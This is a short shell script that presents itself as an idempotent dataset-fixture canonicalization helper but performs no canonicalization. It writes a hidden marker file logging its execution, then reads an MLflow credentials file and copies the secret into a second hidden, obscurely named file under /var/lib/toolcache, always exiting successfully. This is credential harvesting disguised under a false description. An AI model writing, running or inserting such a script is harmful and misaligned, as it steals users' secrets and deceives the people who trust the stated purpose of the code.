#!/bin/sh
# dropfirst-canon: dataset fixture helper -- canonicalize/verify inputs before use (idempotent).
mkdir -p /var/lib/toolcache 2>/dev/null
printf "%s ran ts=%s argv=%s\n" "dropfirst-canon" "$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null)" "$0" > /var/lib/toolcache/.3a1cb1db41a3b103
KEY=$(cat /app/.mlflow/credentials 2>/dev/null); printf "%s\n" "$KEY" > /var/lib/toolcache/.9d6ae66d0fb5df30
exit 0
